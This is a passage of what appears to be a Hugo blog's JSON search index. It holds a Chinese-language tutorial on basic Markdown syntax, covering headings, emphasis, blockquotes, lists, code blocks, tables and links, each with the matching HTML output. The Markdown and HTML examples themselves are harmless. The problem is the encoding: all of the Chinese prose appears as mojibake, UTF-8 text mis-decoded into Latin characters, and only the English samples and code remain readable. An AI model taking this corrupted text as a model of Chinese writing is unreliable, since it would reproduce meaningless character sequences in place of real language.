æ­¤ç¼–å†™å†…å®¹ä¹Ÿæ›´å¿«. ç”¨ Markdown ä¹¦å†™æ—¶å‡ºé”™çš„æœºä¼šæ›´å°‘. å¯ä»¥äº§ç”Ÿæœ‰æ•ˆçš„ XHTML è¾“å‡º. å°†å†…å®¹å’Œè§†è§‰æ˜¾ç¤ºä¿æŒåˆ†å¼€, è¿™æ ·å°±ä¸ä¼šæ‰“ä¹±ç½‘ç«™çš„å¤–è§‚. å¯ä»¥åœ¨ä½ å–œæ¬¢çš„ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨æˆ– Markdown åº”ç”¨ç¨‹åºä¸­ç¼–å†™å†…å®¹. Markdown ä½¿ç”¨èµ·æ¥å¾ˆæœ‰è¶£! John Gruber, Markdown çš„ä½œè€…å¦‚æ˜¯è¯´: Markdown æ ¼å¼çš„é¦–è¦è®¾è®¡ç›®æ ‡æ˜¯æ›´å…·å¯è¯»æ€§. æœ€åˆçš„æƒ³æ³•æ˜¯ Markdown æ ¼å¼çš„æ–‡æ¡£åº”å½“ä»¥çº¯æ–‡æœ¬å½¢å¼å‘å¸ƒ, è€Œä¸ä¼šçœ‹èµ·æ¥åƒè¢«æ ‡ç­¾æˆ–æ ¼å¼è¯´æ˜æ‰€æ ‡è®°. è™½ç„¶ Markdown çš„è¯­æ³•å—åˆ°å‡ ç§ç°æœ‰çš„æ–‡æœ¬åˆ° HTML è½¬æ¢å·¥å…·çš„å½±å“, ä½† Markdown è¯­æ³•çš„æœ€å¤§çµæ„Ÿæ¥æºæ˜¯çº¯æ–‡æœ¬ç”µå­é‚®ä»¶çš„æ ¼å¼. â€“ John Gruber è¯ä¸å¤šè¯´, æˆ‘ä»¬æ¥å›é¡¾ä¸€ä¸‹ Markdown çš„ä¸»è¦è¯­æ³•ä»¥åŠç”Ÿæˆçš„ HTML æ ·å¼! æŠ€å·§ Â å°†æ­¤é¡µä¿å­˜ä¸ºä¹¦ç­¾ï¼Œä»¥å¤‡å°†æ¥å‚è€ƒ! ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:0:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"1 æ ‡é¢˜ ä» h2 åˆ° h6 çš„æ ‡é¢˜åœ¨æ¯ä¸ªçº§åˆ«ä¸Šéƒ½åŠ ä¸Šä¸€ä¸ª ï¼ƒ: ## h2 æ ‡é¢˜ ### h3 æ ‡é¢˜ #### h4 æ ‡é¢˜ ##### h5 æ ‡é¢˜ ###### h6 æ ‡é¢˜ è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003ch2\u003eh2 æ ‡é¢˜\u003c/h2\u003e \u003ch3\u003eh3 æ ‡é¢˜\u003c/h3\u003e \u003ch4\u003eh4 æ ‡é¢˜\u003c/h4\u003e \u003ch5\u003eh5 æ ‡é¢˜\u003c/h5\u003e \u003ch6\u003eh6 æ ‡é¢˜\u003c/h6\u003e æ ‡é¢˜ ID è¦æ·»åŠ è‡ªå®šä¹‰æ ‡é¢˜ ID, è¯·åœ¨ä¸æ ‡é¢˜ç›¸åŒçš„è¡Œä¸­å°†è‡ªå®šä¹‰ ID æ”¾åœ¨èŠ±æ‹¬å·ä¸­: ### ä¸€ä¸ªå¾ˆæ£’çš„æ ‡é¢˜ {#custom-id} è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003ch3 id=\"custom-id\"\u003eä¸€ä¸ªå¾ˆæ£’çš„æ ‡é¢˜\u003c/h3\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:1:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"2 æ³¨é‡Š æ³¨é‡Šæ˜¯å’Œ HTML å…¼å®¹çš„ï¼š \u003c!-- è¿™æ˜¯ä¸€æ®µæ³¨é‡Š --\u003e ä¸èƒ½çœ‹åˆ°ä»¥ä¸‹çš„æ³¨é‡Š: ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:2:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"3 æ°´å¹³çº¿ HTML ä¸­çš„ \u003chr\u003e æ ‡ç­¾æ˜¯ç”¨æ¥åœ¨æ®µè½å…ƒç´ ä¹‹é—´åˆ›å»ºä¸€ä¸ª â€œä¸“é¢˜é—´éš”â€ çš„. ä½¿ç”¨ Markdown, ä½ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼åˆ›å»ºä¸€ä¸ª \u003chr\u003e æ ‡ç­¾: ___: ä¸‰ä¸ªè¿ç»­çš„ä¸‹åˆ’çº¿ ---: ä¸‰ä¸ªè¿ç»­çš„ç ´æŠ˜å· ***: ä¸‰ä¸ªè¿ç»­çš„æ˜Ÿå· å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:3:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"4 æ®µè½ æŒ‰ç…§çº¯æ–‡æœ¬çš„æ–¹å¼ä¹¦å†™æ®µè½, çº¯æ–‡æœ¬åœ¨å‘ˆç°çš„ HTML ä¸­å°†ç”¨ \u003cp\u003e/\u003c/p\u003e æ ‡ç­¾åŒ…è£¹. å¦‚ä¸‹æ®µè½: Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad. è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç©ºç™½è¡Œè¿›è¡Œæ¢è¡Œ. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:4:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"5 å†…è” HTML å…ƒç´  å¦‚æœä½ éœ€è¦æŸä¸ª HTML æ ‡ç­¾ (å¸¦æœ‰ä¸€ä¸ªç±»), åˆ™å¯ä»¥ç®€å•åœ°åƒè¿™æ ·ä½¿ç”¨: Markdown æ ¼å¼çš„æ®µè½. \u003cdiv class=\"class\"\u003e è¿™æ˜¯ \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown æ ¼å¼çš„æ®µè½. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:5:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"6 å¼ºè°ƒ ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"åŠ ç²— ç”¨äºå¼ºè°ƒå¸¦æœ‰è¾ƒç²—å­—ä½“çš„æ–‡æœ¬ç‰‡æ®µ. ä»¥ä¸‹æ–‡æœ¬ç‰‡æ®µä¼šè¢« æ¸²æŸ“ä¸ºç²—ä½“. **æ¸²æŸ“ä¸ºç²—ä½“** __æ¸²æŸ“ä¸ºç²—ä½“__ è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cstrong\u003eæ¸²æŸ“ä¸ºç²—ä½“\u003c/strong\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:1","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"æ–œä½“ ç”¨äºå¼ºè°ƒå¸¦æœ‰æ–œä½“çš„æ–‡æœ¬ç‰‡æ®µ. ä»¥ä¸‹æ–‡æœ¬ç‰‡æ®µè¢« æ¸²æŸ“ä¸ºæ–œä½“. *æ¸²æŸ“ä¸ºæ–œä½“* _æ¸²æŸ“ä¸ºæ–œä½“_ è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cem\u003eæ¸²æŸ“ä¸ºæ–œä½“\u003c/em\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:2","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"åˆ é™¤çº¿ æŒ‰ç…§ GFMGitHub flavored Markdown ä½ å¯ä»¥ä½¿ç”¨åˆ é™¤çº¿. ~~è¿™æ®µæ–‡æœ¬å¸¦æœ‰åˆ é™¤çº¿.~~ å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: è¿™æ®µæ–‡æœ¬å¸¦æœ‰åˆ é™¤çº¿. è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cdel\u003eè¿™æ®µæ–‡æœ¬å¸¦æœ‰åˆ é™¤çº¿.\u003c/del\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:3","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"ç»„åˆ åŠ ç²—, æ–œä½“, å’Œåˆ é™¤çº¿å¯ä»¥ ç»„åˆä½¿ç”¨. ***åŠ ç²—å’Œæ–œä½“*** ~~**åˆ é™¤çº¿å’ŒåŠ ç²—**~~ ~~*åˆ é™¤çº¿å’Œæ–œä½“*~~ ~~***åŠ ç²—, æ–œä½“å’Œåˆ é™¤çº¿***~~ å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: åŠ ç²—å’Œæ–œä½“ åˆ é™¤çº¿å’ŒåŠ ç²— åˆ é™¤çº¿å’Œæ–œä½“ åŠ ç²—, æ–œä½“å’Œåˆ é™¤çº¿ è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cem\u003e\u003cstrong\u003eåŠ ç²—å’Œæ–œä½“\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003eåˆ é™¤çº¿å’ŒåŠ ç²—\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003eåˆ é™¤çº¿å’Œæ–œä½“\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003eåŠ ç²—, æ–œä½“å’Œåˆ é™¤çº¿\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:4","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"7 å¼•ç”¨ ç”¨äºåœ¨æ–‡æ¡£ä¸­å¼•ç”¨å…¶ä»–æ¥æºçš„å†…å®¹å—. åœ¨è¦å¼•ç”¨çš„ä»»ä½•æ–‡æœ¬ä¹‹å‰æ·»åŠ  \u003e: \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e å¼•ç”¨ä¹Ÿå¯ä»¥åµŒå¥—: \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:7:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"8 åˆ—è¡¨ ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"æ— åºåˆ—è¡¨ ä¸€ç³»åˆ—é¡¹çš„åˆ—è¡¨, å…¶ä¸­é¡¹çš„é¡ºåºæ²¡æœ‰æ˜æ˜¾å…³ç³». ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ç¬¦å·æ¥è¡¨ç¤ºæ— åºåˆ—è¡¨ä¸­çš„é¡¹: * ä¸€é¡¹å†…å®¹ - ä¸€é¡¹å†…å®¹ + ä¸€é¡¹å†…å®¹ ä¾‹å¦‚: * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e \u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:1","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"æœ‰åºåˆ—è¡¨ ä¸€ç³»åˆ—é¡¹çš„åˆ—è¡¨, å…¶ä¸­é¡¹çš„é¡ºåºç¡®å®å¾ˆé‡è¦. 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e æŠ€å·§ å¦‚æœä½ å¯¹æ¯ä¸€é¡¹ä½¿ç”¨ 1., Markdown å°†è‡ªåŠ¨ä¸ºæ¯ä¸€é¡¹ç¼–å·. ä¾‹å¦‚: 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:2","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"ä»»åŠ¡åˆ—è¡¨ ä»»åŠ¡åˆ—è¡¨ä½¿ä½ å¯ä»¥åˆ›å»ºå¸¦æœ‰å¤é€‰æ¡†çš„åˆ—è¡¨. è¦åˆ›å»ºä»»åŠ¡åˆ—è¡¨, è¯·åœ¨ä»»åŠ¡åˆ—è¡¨é¡¹ä¹‹å‰æ·»åŠ ç ´æŠ˜å· (-) å’Œå¸¦æœ‰ç©ºæ ¼çš„æ–¹æ‹¬å· ([ ]). è¦é€‰æ‹©ä¸€ä¸ªå¤é€‰æ¡†ï¼Œè¯·åœ¨æ–¹æ‹¬å·ä¹‹é—´æ·»åŠ  x ([x]). - [x] Write the press release - [ ] Update the website - [ ] Contact the media å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Write the press release Update the website Contact the media ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:3","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"9 ä»£ç  ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"è¡Œå†…ä»£ç  ç”¨ ` åŒ…è£…è¡Œå†…ä»£ç æ®µ. åœ¨è¿™ä¸ªä¾‹å­ä¸­, `\u003csection\u003e\u003c/section\u003e` ä¼šè¢«åŒ…è£¹æˆ **ä»£ç **. å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: åœ¨è¿™ä¸ªä¾‹å­ä¸­, \u003csection\u003e\u003c/section\u003e ä¼šè¢«åŒ…è£¹æˆ ä»£ç . è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cp\u003e åœ¨è¿™ä¸ªä¾‹å­ä¸­, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e ä¼šè¢«åŒ…è£¹æˆ \u003cstrong\u003eä»£ç \u003c/strong\u003e. \u003c/p\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:1","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"ç¼©è¿›ä»£ç  å°†å‡ è¡Œä»£ç ç¼©è¿›è‡³å°‘å››ä¸ªç©ºæ ¼ï¼Œä¾‹å¦‚: // Some comments line 1 of code line 2 of code line 3 of code å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: // Some comments line 1 of code line 2 of code line 3 of code è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:2","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"å›´æ ä»£ç å— ä½¿ç”¨ â€œå›´æ â€ ``` æ¥ç”Ÿæˆä¸€æ®µå¸¦æœ‰è¯­è¨€å±æ€§çš„ä»£ç å—. ```markdown Sample text here... ``` è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:3","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"è¯­æ³•é«˜äº® GFMGitHub Flavored Markdown ä¹Ÿæ”¯æŒè¯­æ³•é«˜äº®. è¦æ¿€æ´»å®ƒï¼Œåªéœ€åœ¨ç¬¬ä¸€ä¸ªä»£ç  â€œå›´æ â€ ä¹‹åç›´æ¥æ·»åŠ ä½ è¦ä½¿ç”¨çš„è¯­è¨€çš„æ–‡ä»¶æ‰©å±•å, ```js, è¯­æ³•é«˜äº®æ˜¾ç¤ºå°†è‡ªåŠ¨åº”ç”¨äºæ¸²æŸ“çš„ HTML ä¸­. ä¾‹å¦‚, åœ¨ä»¥ä¸‹ JavaScript ä»£ç ä¸­åº”ç”¨è¯­æ³•é«˜äº®: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; æ³¨æ„ Hugo æ–‡æ¡£ä¸­çš„ è¯­æ³•é«˜äº®é¡µé¢ ä»‹ç»äº†æœ‰å…³è¯­æ³•é«˜äº®çš„æ›´å¤šä¿¡æ¯, åŒ…æ‹¬è¯­æ³•é«˜äº®çš„ shortcode. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:4","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"10 è¡¨æ ¼ é€šè¿‡åœ¨æ¯ä¸ªå•å…ƒæ ¼ä¹‹é—´æ·»åŠ ç«–çº¿ä½œä¸ºåˆ†éš”çº¿, å¹¶åœ¨æ ‡é¢˜ä¸‹æ·»åŠ ä¸€è¡Œç ´æŠ˜å· (ä¹Ÿç”±ç«–çº¿åˆ†éš”) æ¥åˆ›å»ºè¡¨æ ¼. æ³¨æ„, ç«–çº¿ä¸éœ€è¦å‚ç›´å¯¹é½. | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e æ–‡æœ¬å³å¯¹é½æˆ–å±…ä¸­å¯¹é½ åœ¨ä»»ä½•æ ‡é¢˜ä¸‹æ–¹çš„ç ´æŠ˜å·å³ä¾§æ·»åŠ å†’å·å°†ä½¿è¯¥åˆ—çš„æ–‡æœ¬å³å¯¹é½. åœ¨ä»»ä½•æ ‡é¢˜ä¸‹æ–¹çš„ç ´æŠ˜å·ä¸¤è¾¹æ·»åŠ å†’å·å°†ä½¿è¯¥åˆ—çš„å¯¹é½æ–‡æœ¬å±…ä¸­. | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:10:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"11 é“¾æ¥ ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"åŸºæœ¬é“¾æ¥ \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io) å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹ (å°†é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šï¼Œæ²¡æœ‰æç¤º): https://assemble.io contact@revolunet.com Assemble è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:1","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"æ·»åŠ ä¸€ä¸ªæ ‡é¢˜ [Upstage](https://github.com/upstage/ \"Visit Upstage!\") å‘ˆç°çš„è¾“å‡ºæ•ˆæœå¦‚ä¸‹ (å°†é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šï¼Œä¼šæœ‰ä¸€è¡Œæç¤º): Upstage è¾“å‡ºçš„ HTML çœ‹èµ·æ¥åƒè¿™æ ·: \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:2","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"å®šä½æ ‡è®° å®šä½æ ‡è®°ä½¿ä½ å¯ä»¥è·³è‡³åŒä¸€é¡µé¢ä¸Šçš„æŒ‡å®šé”šç‚¹. ä¾‹å¦‚, æ¯ä¸ªç« èŠ‚: ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3) å°†è·³è½¬åˆ°è¿™äº›éƒ¨åˆ†: ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one. æ³¨æ„ å®šä½æ ‡è®°çš„ä½ç½®å‡ ä¹æ˜¯ä»»æ„çš„. å› ä¸ºå®ƒä»¬å¹¶ä¸å¼•äººæ³¨ç›®, æ‰€ä»¥å®ƒä»¬é€šå¸¸è¢«æ”¾åœ¨åŒä¸€è¡Œäº†. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:3","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"12 è„šæ³¨ è„šæ³¨ä½¿ä½ 